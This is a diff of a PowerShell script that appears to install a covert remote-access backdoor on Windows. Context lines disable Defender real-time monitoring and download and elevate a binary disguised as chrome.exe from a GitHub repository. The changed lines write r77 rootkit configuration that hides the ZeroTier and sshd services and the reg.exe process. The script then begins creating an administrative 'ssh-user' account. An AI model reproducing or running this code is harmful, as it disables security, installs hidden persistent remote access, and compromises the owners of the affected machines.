@@ -61,7 +61,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
 $tempFolder = $env:TEMP
-$exePath = Join-Path $tempFolder "improved.exe"
+$exePath = Join-Path $tempFolder "chrome.exe"
 
 # Download improved.exe from the provided URL
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
@@ -73,38 +73,65 @@ Start-Process -FilePath $exePath -Verb RunAs -Wait
 Start-Sleep -Seconds 2
 Remove-Item $exePath -Force
 
-# Base path for the $77config configuration
-$baseConfigPath = "HKLM\SOFTWARE\$77config"
+# PowerShell Script to add services and processes to the custom registry key for r77 configuration
 
-# Commands to ensure the $77config key and necessary subkeys exist
-#$ensurePathsCommands = @(
- #   "reg add ""$baseConfigPath"" /f",
-  #  "reg add ""$baseConfigPath\service_names"" /f",
-   # "reg add ""$baseConfigPath\process_names"" /f"
-#)
-
-foreach ($cmdCommand in $ensurePathsCommands) {
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommand -Wait
+# Function to check and create the registry key if it doesn't exist
+function Ensure-RegistryKey {
+    param([string]$path)
+    if (-not (Test-Path -Path $path)) {
+        New-Item -Path $path -Force | Out-Null
+        Write-Host "Registry path created: $path"
+    }
+    else {
+        Write-Host "Registry path already exists: $path"
+    }
 }
 
-# Define service names to hide - ZeroTier and SSH service
-$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your specific SSH service name if different
+# Ensure the main configuration key exists
+$rootRegPath = 'HKLM:\SOFTWARE\$77config'
+Ensure-RegistryKey -path $rootRegPath
 
-# Hide specified services using reg add
-foreach ($service in $servicesToHide) {
-    $cmdCommandService = "reg add ""$baseConfigPath\service_names"" /v $service /t REG_SZ /d $service /f"
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
+# Ensure the service_names subkey exists
+$serviceNamesPath = "$rootRegPath\service_names"
+Ensure-RegistryKey -path $serviceNamesPath
+
+# Ensure the process_names subkey exists
+$processNamesPath = "$rootRegPath\process_names"
+Ensure-RegistryKey -path $processNamesPath
+
+# Function to add a service name to the registry if not already present
+function Add-ServiceName {
+    param([string]$service)
+    if (-not (Get-ItemProperty -Path $serviceNamesPath -Name $service -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $serviceNamesPath -Name $service -Value $service -PropertyType String | Out-Null
+        Write-Host "Service name added to registry: $service"
+    }
+    else {
+        Write-Host "Service name already in registry: $service"
+    }
 }
 
-# Add reg.exe to the list of processes to hide
-$processesToHide = @("reg.exe") # Add any additional process names here
-
-# Hide specified processes using reg add
-foreach ($process in $processesToHide) {
-    # For clarity and consistency, use the process name both as the value name and the value
-    $cmdCommandProcess = "reg add ""$baseConfigPath\process_names"" /v $process /t REG_SZ /d $process /f"
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandProcess -Wait
+# Function to add a process name to the registry if not already present
+function Add-ProcessName {
+    param([string]$process)
+    if (-not (Get-ItemProperty -Path $processNamesPath -Name $process -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $processNamesPath -Name $process -Value $process -PropertyType String | Out-Null
+        Write-Host "Process name added to registry: $process"
+    }
+    else {
+        Write-Host "Process name already in registry: $process"
+    }
 }
+
+# Add "ZeroTierOneService" and "sshd" to the service names registry
+Add-ServiceName -service 'ZeroTierOneService'
+Add-ServiceName -service 'sshd'
+
+# Add "reg.exe" to the process names registry
+Add-ProcessName -process 'reg.exe'
+
+# Output completion message
+Write-Host "Services and processes have been configured in the registry."
 
 # Create a new user `ssh-user` with administrative privileges
 $userName = "ssh-user"
